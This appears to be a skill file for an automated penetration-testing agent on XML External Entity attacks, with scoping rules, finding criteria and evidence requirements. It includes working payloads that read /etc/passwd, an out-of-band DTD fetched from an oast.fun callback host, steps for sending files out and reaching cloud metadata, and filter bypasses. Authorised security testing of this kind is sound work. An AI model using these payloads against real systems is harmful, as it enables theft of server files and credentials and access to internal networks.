---
name: attack-xxe
description: XML External Entity — abuse an XML parser to read server files and reach internal/OOB resources (XXE→SSRF).
category: web-application
tags: [xxe, injection, xml, ssrf, oob, file-read]
cwe_ids: [CWE-611]
chains_with: [attack-ssrf, oob-interactsh]
tools: [interactsh-client, nuclei, curl]
version: "1.0"
---

# XXE

## Objective
Prove an XML parser resolves an **external entity you define** — returning a server-side file, or
making an out-of-band request you capture. A parser that merely accepts XML is not a finding; the
retrieved file or the callback is. Sends go through the leash: `tools/leashed.sh $T bin/<tool> …`.

## Methodology
1. **Find XML sinks.** Any endpoint eating XML: `Content-Type: application/xml`/`text/xml`, SOAP,
   SAML, SVG/DOCX/XLSX uploads, RSS/sitemap importers, `<xml>` bodies. From recon, list each and its
   verb. Sweep with `tools/leashed.sh $T bin/nuclei -u "$U" -tags xxe` for known parser sinks.
2. **File read (in-band).** POST an entity pointing at a local file and echo it into a reflected node:
   `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>`
   sent via `tools/leashed.sh $T curl -s "$U" -H 'Content-Type: application/xml' --data-binary @xxe.xml`.
   The returned file body is the impact. Try `file://`, `/etc/hostname`, app config, `C:/windows/win.ini`.
3. **Blind / OOB (XXE→SSRF).** No reflection → use an external DTD to a controlled host. Start
   `bin/interactsh-client -json -o raw/xxe/oob.jsonl` (see `oob-interactsh`) and inject:
   `<!DOCTYPE r [<!ENTITY % p SYSTEM "http://<id>.oast.fun/e.dtd"> %p;]>`. A DNS/HTTP callback confirms.
4. **Exfil & reach internal.** Serve an out-of-band DTD that reads a file into a parameter entity and
   POSTs it back to your interactsh host; or point the entity at internal services / cloud metadata
   (`http://169.254.169.254/…`) and capture the response — this is the XXE→SSRF pivot (`attack-ssrf`).
5. **Bypass.** If entities are stripped: try parameter entities, `php://filter` base64 wrapping for
   binary/XML files, UTF-16/encoding tricks, or SVG/Office-doc entry points.

## What counts as a finding
- **Critical/High:** a sensitive server file returned, or internal/metadata content retrieved via the
  parser (credentials/keys = critical). A confirmed OOB callback with no read yet = high (blind XXE).
- **Lead only:** XML is accepted but no entity resolves and no callback fires — a
  `[UNCONFIRMED CANDIDATE]`, never an XXE finding on its own (see `poc-standard`).

## Evidence
Under `raw/xxe/`: the exact XML payload and injecting request, the response containing the file/
internal body, the interactsh callback line (unique subdomain) from `oob.jsonl`, and a runnable PoC.
All target-facing HTTP goes through `tools/leashed.sh`.
